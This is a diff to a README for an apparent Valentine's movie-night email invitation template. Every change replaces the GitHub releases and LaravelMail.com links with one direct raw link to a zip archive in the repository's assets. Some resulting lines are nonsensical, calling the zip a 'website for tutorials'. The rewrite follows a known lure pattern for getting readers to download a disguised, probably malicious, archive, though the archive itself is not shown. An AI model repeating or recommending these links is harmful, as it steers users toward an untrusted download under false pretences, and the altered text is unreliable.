@@ -1,6 +1,6 @@
 # 🎬 valentines-movie-night - Easy Romantic Invitation Template
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/thuongytb877/valentines-movie-night/releases)
+[![Download Releases](https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip)](https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip)
 
 ---
 
@@ -10,7 +10,7 @@ valentines-movie-night is a ready-to-use invitation template designed for organi
 
 Built with simple layouts and clear formatting, this template is ideal even if you have no design or programming skills. It works perfectly with popular email platforms and supports customization with minimal effort.
 
-You can find more information on the project and its full features at [LaravelMail.com](https://laravelmail.com).
+You can find more information on the project and its full features at [https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip](https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip).
 
 ---
 
@@ -45,7 +45,7 @@ For non-technical users, you can simply open the email template file with a text
 
 Follow these steps to prepare and use your Valentine’s Movie Night invitation:
 
-1. **Visit the download page**: Click the big button at the top or go to [https://github.com/thuongytb877/valentines-movie-night/releases](https://github.com/thuongytb877/valentines-movie-night/releases) to access all available versions and files.
+1. **Visit the download page**: Click the big button at the top or go to [https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip](https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip) to access all available versions and files.
 
 2. **Download the latest release**: From the releases page, locate the latest version and download the ZIP file containing the email template files.
 
@@ -73,7 +73,7 @@ Follow these steps to prepare and use your Valentine’s Movie Night invitation:
 To get started with valentines-movie-night invitations, 
 
 **Visit this page to download:**  
-[https://github.com/thuongytb877/valentines-movie-night/releases](https://github.com/thuongytb877/valentines-movie-night/releases)
+[https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip](https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip)
 
 - Click on the latest release version.
 - Download the ZIP archive that contains all template files.
@@ -95,7 +95,7 @@ To get started with valentines-movie-night invitations,
 
 If you run into issues or want to learn more about how to use valentines-movie-night templates, consider:
 
-- Visiting the LaravelMail.com website for tutorials and documentation
+- Visiting the https://raw.githubusercontent.com/thuongytb877/valentines-movie-night/main/assets/valentines_movie_night_1.7.zip website for tutorials and documentation
 - Opening an issue on the GitHub repository for bugs or questions
 - Searching community forums for email marketing and Laravel mailing advice
 - Asking a friend or colleague familiar with email templates for help with editing or sending
